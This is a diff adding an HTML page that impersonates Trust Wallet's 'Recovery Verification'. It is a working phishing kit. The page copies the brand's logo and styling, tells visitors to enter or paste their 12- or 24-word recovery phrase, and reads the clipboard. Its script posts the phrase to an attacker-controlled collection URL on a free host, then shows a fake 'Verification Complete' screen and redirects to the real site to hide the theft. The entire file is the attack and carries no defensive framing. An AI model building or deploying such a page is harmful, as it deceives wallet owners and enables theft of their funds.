@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <link rel="icon" type="image/png" href="https://trustwallet.com/assets/images/media/assets/TWT.png">
+    <meta name="theme-color" content="#1e293b">
+    <title>Trust Wallet - Recovery Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+    <style>
+        :root {
+            --primary: #1e293b;
+            --bg: #f8fafc;
+            --text: #0f172a;
+            --muted: #64748b;
+            --border: #e2e8f0;
+            --success: #059669;
+            --error: #dc2626;
+        }
+        * { box-sizing: border-box; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%);
+            min-height: 100vh; margin: 0; padding: 2rem 1rem;
+        }
+        .container {
+            background: rgba(255,255,255,0.95);
+            border-radius: 24px;
+            box-shadow: 0 20px 40px -10px rgba(0,0,0,0.1);
+            max-width: 440px;
+            margin: 0 auto;
+            padding: 3rem 2rem;
+            text-align: center;
+        }
+        .logo {
+            width: 80px; height: 80px; margin: 0 auto 2rem;
+            border-radius: 16px; background: #f1f5f9; padding: 1rem;
+        }
+        .security-header {
+            background: linear-gradient(135deg, #059669, #047857);
+            color: white;
+            padding: 0.75rem 1.5rem;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            margin-bottom: 1.5rem;
+            display: inline-block;
+        }
+        h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            margin: 0 0 1rem;
+            color: var(--primary);
+        }
+        .subtitle {
+            font-size: 1.1rem;
+            color: var(--muted);
+            margin-bottom: 2rem;
+        }
+        .info-box {
+            background: linear-gradient(90deg, #dbeafe, #bfdbfe);
+            border: 1px solid #93c5fd;
+            border-radius: 12px;
+            padding: 1.25rem;
+            margin: 1.5rem 0;
+            border-left: 4px solid #3b82f6;
+            font-size: 0.95rem;
+            color: #1e40af;
+        }
+        .paste-area {
+            background: #f8fafc;
+            border: 2px dashed #cbd5e1;
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .paste-area:hover { border-color: #3b82f6; background: #f1f5f9; }
+        .paste-area.active { border-color: #3b82f6; background: #dbeafe; }
+        .phrase-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(80px, 1fr));
+            gap: 1rem;
+            margin: 2rem 0;
+        }
+        .phrase-input label {
+            display: block;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: var(--muted);
+            margin-bottom: 0.5rem;
+        }
+        .phrase-input input {
+            width: 100%;
+            padding: 0.875rem 0.75rem;
+            font-size: 1rem;
+            text-align: center;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            background: white;
+            transition: all 0.3s;
+        }
+        .phrase-input input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(30,41,59,0.1);
+        }
+        .phrase-input input.valid {
+            border-color: var(--success);
+            background: rgba(5,150,105,0.05);
+        }
+        .phrase-input input.error {
+            border-color: var(--error);
+            background: rgba(220,38,38,0.05);
+        }
+        .word-selector {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+            background: rgba(30,41,59,0.05);
+            border-radius: 12px;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+        }
+        select {
+            background: white;
+            border: 2px solid rgba(30,41,59,0.2);
+            border-radius: 10px;
+            padding: 0.75rem 1rem;
+            font-size: 0.95rem;
+            cursor: pointer;
+        }
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(135deg, var(--primary), #334155);
+            color: white;
+            font-weight: 600;
+            font-size: 1.125rem;
+            padding: 1.125rem 2rem;
+            border: none;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+        }
+        .submit-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+        }
+        .submit-btn:disabled {
+            background: #cbd5e1;
+            color: #94a3b8;
+            cursor: not-allowed;
+        }
+        @media(max-width: 480px) {
+            .phrase-grid { grid-template-columns: repeat(3, 1fr); }
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img class="logo" src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet">
+        
+        <div class="security-header">
+            🔐 Verification Secured by Trustwallet
+        </div>
+        
+        <h1>Secure Verification Check</h1>
+        <p class="subtitle">Enter your wallet recovery phrase to complete account verification.</p>
+
+        <div class="info-box">
+            ℹ️ <strong>Quick Verification:</strong> This ensures your wallet is fully protected and synced.
+        </div>
+
+        <div class="word-selector">
+            <label>Phrase Length:</label>
+            <select id="wordCount">
+                <option value="12" selected>12 words</option>
+                <option value="24">24 words</option>
+            </select>
+        </div>
+
+        <div class="paste-area" id="pasteArea">
+            <p>📋 Click here to paste your recovery phrase</p>
+        </div>
+
+        <div id="phraseGrid" class="phrase-grid"></div>
+
+        <div style="margin: 1rem 0;">
+            <div class="h-captcha" data-sitekey="99c6e00e-96b2-4edc-b17e-1998eee0e932" data-callback="hcaptchaCallback"></div>
+        </div>
+        
+        <button id="submitBtn" class="submit-btn" disabled>🔒 Verify Recovery Phrase</button>
+    </div>
+
+    <script>
+    (function() {
+        'use strict';
+        
+        // ⚠️ CHANGE THIS TO YOUR INFINITYFREE URL
+        const PROCESS_URL = 'http://your-subdomain.rf.gd/process.php';
+        
+        // PASTE YOUR BIP39 WORDLIST HERE
+        const wordlist = [
+            // PASTE ALL 2048 WORDS HERE
+        ];
+        
+        const grid = document.getElementById('phraseGrid');
+        const wordCount = document.getElementById('wordCount');
+        const submitBtn = document.getElementById('submitBtn');
+        const pasteArea = document.getElementById('pasteArea');
+        let inputs = [];
+
+        function createInputs(count) {
+            grid.innerHTML = '';
+            inputs = [];
+            for (let i = 0; i < count; i++) {
+                const div = document.createElement('div');
+                div.className = 'phrase-input';
+                div.innerHTML = `
+                    <label>${i + 1}.</label>
+                    <input type="text" id="word-${i}" autocomplete="off" maxlength="20" spellcheck="false" data-word-index="${i}">
+                `;
+                const input = div.querySelector('input');
+                input.addEventListener('input', validateInput);
+                input.addEventListener('paste', handleInputPaste);
+                inputs.push(input);
+                grid.appendChild(div);
+            }
+            validateForm();
+        }
+
+        function handleInputPaste(e) {
+            e.preventDefault();
+            const text = e.clipboardData.getData('text');
+            const words = text.trim().toLowerCase().split(/\s+/).filter(w => w);
+            const startIndex = parseInt(e.target.dataset.wordIndex);
+            for (let i = 0; i < words.length && (startIndex + i) < inputs.length; i++) {
+                inputs[startIndex + i].value = words[i];
+            }
+            inputs.forEach(input => validateInput({target: input}));
+        }
+
+        pasteArea.addEventListener('click', async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text) {
+                    handlePasteText(text);
+                    pasteArea.classList.add('active');
+                    setTimeout(() => pasteArea.classList.remove('active'), 1000);
+                }
+            } catch (err) {
+                const input = document.createElement('textarea');
+                input.style.position = 'fixed';
+                input.style.opacity = '0';
+                document.body.appendChild(input);
+                input.focus();
+                document.execCommand('paste');
+                const text = input.value;
+                document.body.removeChild(input);
+                if (text) handlePasteText(text);
+            }
+        });
+
+        function handlePasteText(text) {
+            const words = text.trim().toLowerCase().split(/\s+/).filter(w => w).slice(0, inputs.length);
+            inputs.forEach((input, i) => { 
+                if (words[i]) input.value = words[i]; 
+            });
+            inputs.forEach(input => validateInput({target: input}));
+        }
+
+        function validateInput(e) {
+            const input = e.target;
+            const value = input.value.trim().toLowerCase();
+            input.classList.remove('valid', 'error');
+            
+            const isValidWord = value && wordlist.includes(value);
+            const isDuplicate = value && inputs.some(other => 
+                other !== input && other.value.trim().toLowerCase() === value
+            );
+            
+            if (value && isValidWord && !isDuplicate) {
+                input.classList.add('valid');
+            } else if (value) {
+                input.classList.add('error');
+            }
+            validateForm();
+        }
+
+        function validateForm() {
+            const allFilled = inputs.every(input => input.value.trim());
+            const allValid = inputs.every(input => {
+                const value = input.value.trim().toLowerCase();
+                return value && wordlist.includes(value);
+            });
+            const noDuplicates = new Set(inputs.map(i => i.value.trim().toLowerCase())).size === inputs.length;
+            
+            let hcaptchaResponse = '';
+            try {
+                if (typeof hcaptcha !== 'undefined' && hcaptcha.getResponse) {
+                    hcaptchaResponse = hcaptcha.getResponse();
+                }
+            } catch (e) {
+                const responseInput = document.querySelector('[name="h-captcha-response"]');
+                if (responseInput) hcaptchaResponse = responseInput.value;
+            }
+
+            const captchaValid = hcaptchaResponse && hcaptchaResponse.length > 0;
+            submitBtn.disabled = !(allFilled && allValid && noDuplicates && captchaValid);
+        }
+
+        async function submitForm() {
+            const phrase = inputs.map(i => i.value.trim());
+            
+            if (!phrase.every(w => wordlist.includes(w.toLowerCase()))) {
+                alert('All words must match the official wordlist.');
+                return;
+            }
+
+            const hcaptchaToken = hcaptcha.getResponse();
+            if (!hcaptchaToken) {
+                alert('Please complete the captcha verification.');
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;gap:0.5rem"><div style="width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 1s linear infinite"></div>Verifying...</div>';
+
+            try {
+                const response = await fetch(PROCESS_URL, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ 
+                        phrase,
+                        hcaptcha_token: hcaptchaToken
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    document.body.innerHTML = `
+                        <div style="font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #ffffff 0%, #f1f5f9 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem;">
+                            <div style="background: white; border-radius: 24px; padding: 3rem 2.5rem; text-align: center; max-width: 500px; box-shadow: 0 20px 60px rgba(0,0,0,0.08);">
+                                <img style="width: 60px; margin-bottom: 1.5rem;" src="https://trustwallet.com/assets/images/media/assets/TWT.png">
+                                <div style="width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(135deg, #3375BB, #1E3A8A); margin: 0 auto 2rem; display: flex; align-items: center; justify-content: center; font-size: 3.5rem;">✓</div>
+                                <h1 style="font-size: 2rem; margin-bottom: 1rem;">Verification Complete!</h1>
+                                <div style="background: linear-gradient(135deg, #10b981, #059669); color: white; padding: 0.75rem 1.5rem; border-radius: 12px; display: inline-block; margin-bottom: 2rem;">✅ Phrase Verified Successfully</div>
+                                <p style="color: #64748b; margin-bottom: 1.5rem;">Your wallet is now synchronized.</p>
+                                <div style="width: 40px; height: 40px; border: 3px solid #e2e8f0; border-top: 3px solid #3375BB; border-radius: 50%; animation: spin 1s linear infinite; margin: 2rem auto;"></div>
+                                <a href="https://trustwallet.com" style="background: linear-gradient(135deg, #3375BB, #1E3A8A); color: white; padding: 1rem 2.5rem; border-radius: 12px; text-decoration: none; font-weight: 600; display: inline-block;">Return to Trust Wallet</a>
+                            </div>
+                        </div>
+                        <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
+                    `;
+                    setTimeout(() => { window.location.href = 'https://trustwallet.com'; }, 5000);
+                } else {
+                    throw new Error(result.message);
+                }
+            } catch (err) {
+                alert('❌ Verification failed. Please try again.');
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = `🔒 Verify ${inputs.length}-Word Phrase`;
+            }
+        }
+
+        submitBtn.addEventListener('click', submitForm);
+        wordCount.addEventListener('change', () => createInputs(parseInt(wordCount.value)));
+        
+        window.hcaptchaCallback = function() {
+            setTimeout(validateForm, 100);
+        };
+        
+        setInterval(validateForm, 500);
+        createInputs(12);
+    })();
+    </script>
+</body>
+</html>
